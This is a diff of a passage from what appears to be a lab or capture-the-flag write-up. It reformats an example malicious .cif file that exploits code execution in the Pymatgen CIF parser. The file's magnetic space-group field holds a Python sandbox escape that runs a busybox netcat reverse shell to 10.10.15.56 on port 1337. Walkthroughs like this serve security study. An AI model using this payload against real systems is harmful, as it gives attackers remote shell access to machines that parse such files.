@@ -52,28 +52,29 @@ All we need to do is craft a malicious .cif file, and then inject the command we
 
 <br><br>
 
-> *data_Example*
+> data_5yOhtAoR
+> data_Example
 >
-> *audit_creation_date            2018-06-08*
+> audit_creation_date            2018-06-08
 > 
-> *_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"*
+> _audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"
 > 
-> *loop*
+> loop
 > 
-> *parent_propagation_vector.id*
+> parent_propagation_vector.id
 > 
-> *_parent_propagation_vector.kxkykz*
+> _parent_propagation_vector.kxkykz
 > 
-> *k1 [0 0 0]*
-> 
-> 
-> *_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ()._class_._mro_[1]._getattribute_ ( *[().__class__.__mro__[1]]+["_sub" + "classes_"]) () if d._name_ == "BuiltinImporter"][0].load_module ("os").system ("busybox nc 10.10.15.56 1337 -e sh");0,0,0'*
+> k1 [0 0 0]
 > 
 > 
+> _space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ()._class_._mro_[1]._getattribute_ ( *[().__class__.__mro__[1]]+["_sub" + "classes_"]) () if d._name_ == "BuiltinImporter"][0].load_module ("os").system ("busybox nc 10.10.15.56 1337 -e sh");0,0,0'
 > 
-> *_space_group_magn.number_BNS  62.448*
 > 
-> *_space_group_magn.name_BNS  "P  n'  m  a'  "*
+> 
+> _space_group_magn.number_BNS  62.448
+> 
+> _space_group_magn.name_BNS  "P  n'  m  a'  "
 > 
 > 
 
